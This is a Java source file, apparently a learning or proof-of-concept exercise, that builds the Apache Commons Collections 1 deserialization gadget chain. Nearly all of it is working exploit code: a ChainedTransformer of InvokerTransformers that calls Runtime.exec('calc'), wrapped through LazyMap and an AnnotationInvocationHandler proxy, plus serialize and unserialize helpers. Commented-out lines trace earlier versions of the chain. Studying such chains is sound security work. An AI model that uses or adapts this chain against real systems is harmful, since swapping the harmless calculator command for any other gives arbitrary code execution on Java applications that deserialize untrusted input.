package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.OnePredicate;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.ReferenceMap;
import org.apache.commons.collections.map.TransformedMap;
import sun.reflect.annotation.AnnotationType;

import javax.print.DocFlavor;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

import java.lang.reflect.Proxy;
import java.util.*;

public class CC1Test
{
    public static void main( String[] args ) throws Exception
    {
//        Runtime.getRuntime().exec("calc");
//        Runtime r = Runtime.getRuntime();
//        Class c = Runtime.class;
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(r,"calc");
//
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        //invokerTransformer.transform(r);

//        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime", null}).transform(Runtime.class);
//        Runtime r  = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null, null}).transform(getRuntimeMethod);
//        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(r);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };


        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


//        HashMap<Object, Object> map = new HashMap<>();
//        map.put("value","aaa");
//        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
//
//
//        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class,Map.class);
//        annotationInvocationdhdlConstructor.setAccessible(true);
//        Object o  = annotationInvocationdhdlConstructor.newInstance(Target.class,transformedMap);
//
//        serialize(o);
//        unserialize("ser.bin");

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class,Map.class);
        annotationInvocationdhdlConstructor.setAccessible(true);
        InvocationHandler h = (InvocationHandler) annotationInvocationdhdlConstructor.newInstance(Override.class,lazyMap);

        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, h);

        Object o = annotationInvocationdhdlConstructor.newInstance(Override.class, mapProxy);
//        serialize(o);
        unserialize("ser.bin");

    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois= new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
